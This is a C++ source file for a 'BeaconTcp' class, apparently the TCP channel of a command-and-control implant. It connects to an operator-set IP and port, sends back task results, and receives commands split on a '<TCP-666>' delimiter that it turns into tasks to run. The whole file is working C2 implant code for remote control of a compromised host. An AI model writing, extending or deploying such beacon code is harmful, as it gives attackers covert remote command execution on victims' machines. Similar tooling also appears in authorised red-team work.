#include "BeaconTcp.hpp"

using namespace std;


BeaconTcp::BeaconTcp(std::string& config, std::string& ip, int port)
	: Beacon()
{
	m_ip = ip;
    m_port = port;

	// beacon and modules config
    initConfig(config);

	m_client=new SocketTunnelClient();
}


BeaconTcp::~BeaconTcp()
{
	delete m_client;
}


int BeaconTcp::splitInPacket(const std::string& input, std::vector<std::string>& output) 
{
    std::string delimiter = "<TCP-666>";
    size_t pos = 0;
    size_t start = 0;

    while ((pos = input.find(delimiter, start)) != std::string::npos) {
        output.push_back(input.substr(start, pos - start));
        start = pos + delimiter.length();
    }

    if (start < input.length()) 
	{
        output.push_back(input.substr(start));
    }

    return output.size();
}


void BeaconTcp::checkIn()
{	
	int ret = m_client->init(m_ip, m_port);

	if(ret)
	{
		std::string output;
		taskResultsToCmd(output);

		output.append("<TCP-666>");

		std::string input;
		int res = m_client->process(output, input);

		if(res<0)
		{
			m_client->reset();
		}
		else if(!input.empty())
		{
			std::vector<std::string> trames;
			splitInPacket(input, trames);

			for(int i=0; i<trames.size(); i++)
				cmdToTasks(trames[i]);
		}

	}
}

	



